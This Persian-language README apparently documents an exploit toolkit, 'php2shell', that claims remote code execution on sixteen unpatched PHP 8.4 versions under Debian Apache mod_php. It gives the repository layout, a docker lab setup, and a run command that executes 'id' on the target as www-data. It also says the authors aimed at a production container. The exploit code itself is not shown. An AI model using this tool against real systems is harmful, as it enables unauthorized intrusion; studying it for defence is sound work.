# php2shell 8.4 — Debian Apache (mod_php)

۱۶ اکسپلویت عملی برای نسخه‌های **PHP 8.4 پیش از اصلاح**، روی هدف
**Debian + Apache mod_php** (`apache2handler`) با پروفایل
`php.ini-production`.

> **فقط استفاده مجاز.** این ابزار را تنها در آزمایشگاه خودتان یا روی هدفی با
> اجازه کتبی اجرا کنید. موفقیت یعنی وجود فایل proof روی هدف؛ بدون proof،
> نتیجه **RCE نیست**.

زبان‌ها: [pt-BR](../../README.md) · [English](README.en.md) · [中文](README.zh.md) ·
[فارسی](README.fa.md) · [العربية](README.ar.md) · [Русский](README.ru.md) ·
[한국어](README.ko.md)




آسیب‌پذیری را مستقلاً از اطلاعیه اولیه بررسی کردیم، یک PoC در آزمایشگاه ساختیم و سپس بر رسیدن به یک کانتینر تولیدی تمرکز کردیم.

## نسخه‌های پوشش‌داده‌شده (۱۶)

| بازه | نسخه‌ها | `s_off` مرحله ۳ |
|:--|:--|:--|
| 8.4.11–8.4.26 | ۱۶ نسخه | `0xF8398` |

## محتوای مخزن

```text
engine/pure_fixed.js     موتور A1→B1→A2→B2
profiles/*.json          ۱۶ پروفایل: نمادها، s_off، پیش‌نیازها
run.js                   انتخاب پروفایل و اجرای موتور
target/                  php.ini-production + Apache prefork 150 + index.php
tests/*.test.js   اعتبارسنجی ۱۶ پروفایل
```

`run.js` اسکن نمی‌کند: هر بار **یک** نسخه را با فایل proof اجرا می‌کند.

## پیش‌نیازها

- Node.js 20+ روی ماشین اپراتور.
- Docker روی هدف/آزمایشگاه.
- ایمیج رسمی `php:<version>-apache` (Debian) با mount کردن
  `target/php.ini` و `target/apache.conf`.
- یک volume مشترک برای proof (`/out` روی هدف).

## شروع سریع (آزمایشگاه محلی)

```bash
mkdir -p out
docker run -d --name p2s-8426 -p 19300:80 \
  -v "$PWD/target/php.ini:/usr/local/etc/php/php.ini:ro" \
  -v "$PWD/target/apache.conf:/etc/apache2/conf-enabled/zz-prod.conf:ro" \
  -v "$PWD/target/www:/var/www/html:ro" \
  -v "$PWD/out:/out" \
  php:8.4.26-apache

./run.js --version 8.4.26 --host 127.0.0.1 --port 19300 \
  --proof out/p1 --cmd 'id>/out/p1' --retries 4 --probes 6

cat out/p1
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

برای نسخه دیگر، `8.4.26` و تگ ایمیج را عوض کنید.

## خواندن نتیجه

| خروجی | معنی |
|:--|:--|
| `out/p1` شامل `uid=...` | اجرا اثبات شد |
| موتور می‌گوید proof اما فایل خالی است | **RCE نیست**؛ شکست خورده |
| `leak failed` / `no proof` | اجرا نشد؛ هدف را ری‌استارت و دوباره تلاش کنید |

هر تلاش باید با worker تمیز شروع شود. `run.js` کانتینر را ری‌استارت نمی‌کند.

## محدودیت‌های صادقانه

- دسترسی `www-data` است، نه root.
- نتیجه به build دقیق ایمیج وابسته است؛ هنگام تکرار tag/digest را ثابت کنید.

## تست‌ها

```bash
node --test
```

## مستندات

- `docs/como-reproduzir.md` — گام‌به‌گام و عیب‌یابی (pt-BR).

## هشدار

این مطالب برای پژوهش امنیتی مجاز است. بدون اجازه علیه سیستم‌های شخص ثالث
استفاده نکنید. مسئولیت استفاده با اپراتور است.